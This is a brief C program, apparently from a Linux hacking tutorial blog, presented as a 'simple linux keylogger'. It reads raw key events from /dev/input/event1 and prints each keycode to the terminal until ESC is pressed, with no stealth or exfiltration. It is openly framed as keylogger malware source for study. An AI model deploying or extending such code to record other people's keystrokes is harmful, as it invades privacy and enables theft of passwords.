/*
 * hack.c
 * simple linux keylogger
 * author @cocomelonc
 * https://cocomelonc.github.io/linux/2025/06/03/linux-hacking-5.html
 */
#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  // ls -l /dev/input/by-path/ | grep kbd
  const char *dev = "/dev/input/event1";
  struct input_event ev;
  int fd = open(dev, O_RDONLY);
  if (fd < 0) {
    perror("open");
    return 1;
  }
  printf("keylogger started. press ESC to exit.\n");
  while (1) {
    ssize_t n = read(fd, &ev, sizeof(struct input_event));
    if (n == (ssize_t)sizeof(struct input_event)) {
      if (ev.type == EV_KEY && ev.value == 1) { // keydown
        printf("keycode: %d\n\n", ev.code);
        fflush(stdout);
        if (ev.code == 1) { // 1 = ESC
          printf("ESC pressed, exiting.\n");
          break;
        }
      }
    }
  }
  close(fd);
  return 0;
}
